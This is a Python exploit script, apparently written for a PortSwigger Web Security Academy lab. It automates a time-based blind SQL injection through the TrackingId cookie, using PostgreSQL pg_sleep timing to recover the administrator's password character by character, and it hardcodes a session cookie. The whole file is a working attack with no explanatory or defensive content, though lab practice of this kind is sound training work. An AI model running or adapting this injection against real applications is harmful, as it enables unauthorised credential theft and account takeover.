#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n [+] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a7000ce03e390f38291290c00c2000b.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def makeRequests():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)
    
    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "' || (select case when(username='administrator' and substring(password,%d,1)='%s') then pg_sleep(10) else pg_sleep(-1) end from users)-- -" % (position, character),
                'session': 'jaTbsdAZDEH7IgEeLaEjjOLjYOsFv4Eb'
            }

            p1.status(cookies['TrackingId'])
            
            start_time = time.time()
            
            r = requests.get(main_url, cookies=cookies)

            end_time = time.time()

            elapse_time = end_time - start_time

            if elapse_time >= 10:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    makeRequests()
